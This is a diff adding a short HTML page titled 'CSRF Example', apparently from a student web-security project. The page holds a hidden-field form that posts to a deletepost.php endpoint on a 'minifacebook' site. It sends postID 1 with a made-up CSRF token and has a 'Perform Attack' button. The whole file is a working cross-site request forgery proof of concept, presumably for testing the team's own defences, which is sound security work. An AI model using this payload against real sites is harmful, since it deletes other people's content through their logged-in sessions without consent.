@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>CSRF Example</title>
+    </head>
+    <body>
+        <h1>CSRF Example</h1>
+        <form id="csrfForm" action="https://waph-team15.minifacebook.com/deletepost.php" method="post">
+            <input type="hidden" name="postID" value="1"/>
+            <input type="hidden" name="nocsrftoken" value="1">
+            <button class="button" type="submit">Perform Attack</button>
+        </form>
+    </body>
+</html>
